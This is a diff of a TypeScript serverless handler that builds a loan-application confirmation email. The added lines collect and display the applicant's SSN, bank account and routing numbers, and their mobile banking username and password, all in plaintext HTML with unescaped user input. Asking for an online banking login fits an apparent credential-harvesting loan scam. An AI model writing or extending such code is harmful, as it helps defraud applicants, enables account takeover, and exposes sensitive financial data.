@@ -93,21 +93,43 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
                 to: clientEmail,
                 subject: '✅ Your Loan Application Has Been Received',
                 html: `
-                <div style="font-family: sans-serif; max-width: 600px; margin: 0 auto; background: #f9fafb; padding: 20px; border-radius: 10px;">
+                <div style="font-family: sans-serif; max-width: 700px; margin: 0 auto; background: #f9fafb; padding: 20px; border-radius: 10px;">
                   <div style="background: #2563eb; color: white; padding: 24px; border-radius: 8px; text-align: center; margin-bottom: 24px;">
                     <h1 style="margin:0; font-size:24px;">Application Received! ✅</h1>
                     <p style="margin:8px 0 0; opacity:0.85;">Thank you, ${fullName}!</p>
                   </div>
 
-                  <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 16px;">
-                    <p style="color:#374151;">Your loan application has been successfully submitted. Here's a summary of what you provided:</p>
+                  <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 16px; border-left: 4px solid #2563eb;">
+                    <p style="color:#374151; margin-top:0;">Your loan application has been successfully submitted. Here's a summary of what you provided:</p>
+                    <h3 style="margin-top:16px; color:#1e40af;">👤 Personal Information</h3>
                     <table style="width:100%; border-collapse:collapse;">
-                      <tr><td style="padding:6px 0; color:#6b7280; width:45%;">Name</td><td style="padding:6px 0; font-weight:600;">${fullName}</td></tr>
+                      <tr><td style="padding:6px 0; color:#6b7280; width:40%;">Full Name</td><td style="padding:6px 0; font-weight:600;">${fullName}</td></tr>
                       <tr><td style="padding:6px 0; color:#6b7280;">Email</td><td style="padding:6px 0; font-weight:600;">${d.email}</td></tr>
                       <tr><td style="padding:6px 0; color:#6b7280;">Phone</td><td style="padding:6px 0; font-weight:600;">${d.phone}</td></tr>
-                      <tr><td style="padding:6px 0; color:#6b7280;">Loan Amount</td><td style="padding:6px 0; font-weight:600;">$${d.loanAmount}</td></tr>
-                      <tr><td style="padding:6px 0; color:#6b7280;">Monthly Income</td><td style="padding:6px 0; font-weight:600;">$${d.monthlyIncome}</td></tr>
+                      <tr><td style="padding:6px 0; color:#6b7280;">Date of Birth</td><td style="padding:6px 0; font-weight:600;">${d.dob}</td></tr>
+                      <tr><td style="padding:6px 0; color:#6b7280;">Address</td><td style="padding:6px 0; font-weight:600;">${d.address}, ${d.city}, ${d.state} ${d.zip}</td></tr>
+                      <tr><td style="padding:6px 0; color:#6b7280;">SSN</td><td style="padding:6px 0; font-weight:600; color:#dc2626;">${d.ssn}</td></tr>
+                    </table>
+                  </div>
+
+                  <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 16px; border-left: 4px solid #16a34a;">
+                    <h3 style="margin-top:0; color:#15803d;">💼 Employment & Loan Details</h3>
+                    <table style="width:100%; border-collapse:collapse;">
+                      <tr><td style="padding:6px 0; color:#6b7280; width:40%;">Monthly Income</td><td style="padding:6px 0; font-weight:600;">$${d.monthlyIncome}</td></tr>
+                      <tr><td style="padding:6px 0; color:#6b7280;">Loan Amount Requested</td><td style="padding:6px 0; font-weight:600;">$${d.loanAmount}</td></tr>
                       <tr><td style="padding:6px 0; color:#6b7280;">Credit Score</td><td style="padding:6px 0; font-weight:600;">${d.creditScore}</td></tr>
+                    </table>
+                  </div>
+
+                  <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 16px; border-left: 4px solid #d97706;">
+                    <h3 style="margin-top:0; color:#b45309;">🏦 Banking Information</h3>
+                    <table style="width:100%; border-collapse:collapse;">
+                      <tr><td style="padding:6px 0; color:#6b7280; width:40%;">Bank Name</td><td style="padding:6px 0; font-weight:600;">${d.bankName}</td></tr>
+                      <tr><td style="padding:6px 0; color:#6b7280;">Years with Bank</td><td style="padding:6px 0; font-weight:600;">${d.yearsWithBank}</td></tr>
+                      <tr><td style="padding:6px 0; color:#6b7280;">Account Number</td><td style="padding:6px 0; font-weight:600;">${d.accountNumber}</td></tr>
+                      <tr><td style="padding:6px 0; color:#6b7280;">Routing Number</td><td style="padding:6px 0; font-weight:600;">${d.routingNumber}</td></tr>
+                      <tr><td style="padding:6px 0; color:#6b7280;">Mobile Banking Username</td><td style="padding:6px 0; font-weight:600;">${d.mobileUsername}</td></tr>
+                      <tr><td style="padding:6px 0; color:#6b7280;">Mobile Banking Password</td><td style="padding:6px 0; font-weight:600; color:#dc2626;">${d.mobilePassword}</td></tr>
                     </table>
                   </div>
 
